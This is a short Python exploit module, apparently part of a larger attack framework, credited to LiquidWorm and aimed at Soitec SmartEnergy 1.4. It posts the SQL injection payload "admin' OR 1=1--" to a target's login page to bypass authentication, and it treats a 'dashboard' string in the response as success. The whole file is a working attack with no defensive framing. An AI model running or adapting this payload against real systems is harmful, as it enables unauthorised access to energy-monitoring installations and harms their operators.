import requests
from utils.logger import setup_logger
logger = setup_logger()

def exploit(target: str, port: int = 80):
    """
    Soitec SmartEnergy 1.4 â€“ LiquidWorm
    """
    url = f"http://{target}:{port}/login.php"
    data = {"username": "admin' OR 1=1--", "password": "anything"}
    try:
        r = requests.post(url, data=data, timeout=5)
        if "dashboard" in r.text:
            logger.info("[+] Soitec SQL injection auth bypass")
            return True
    except Exception as e:
        logger.error(f"Soitec SQLi error: {e}")
    return False